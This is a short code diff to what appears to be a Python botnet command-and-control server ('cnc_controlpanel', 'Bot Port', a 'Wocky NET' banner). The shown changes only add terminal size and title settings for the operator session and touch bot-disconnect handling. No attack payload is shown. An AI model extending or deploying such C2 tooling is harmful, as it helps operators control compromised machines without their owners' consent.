@@ -10,6 +10,7 @@ import socket, sys, os, requests, time, threading, random, datetime, subprocess
 # Files
 from assets.cnc_controlpanel.main import *
 from assets.Config.main import *
+from assets.utils.CLI import *
 
 from assets.Commands.main_screen import *
 from assets.Commands.command_handler import *
@@ -28,7 +29,9 @@ cp_hostname = "\rQuantum >>: "
 print(f"Bot Port: {port}\r\n")
 
 def handle_connection(client, addr):
-        MainScreen(client, addr[0])
+        CLI_Control.set_TerminalSize(client, 60, 79)
+        CLI_Control.set_Title(client, "Welcome to Wocky NET!")
+        MainScreen(client, addr)
         while(True):
                 CMDHandler(client, addr)
 
@@ -69,6 +72,7 @@ def bot_handle(client, addr):
                         if msg_c > 10:
                                 client.close()
                                 print("Bot disconnected")
+                                # ServerConfig.bots.delete
                                 sys.exit()
                         msg_c+=1
                 else:
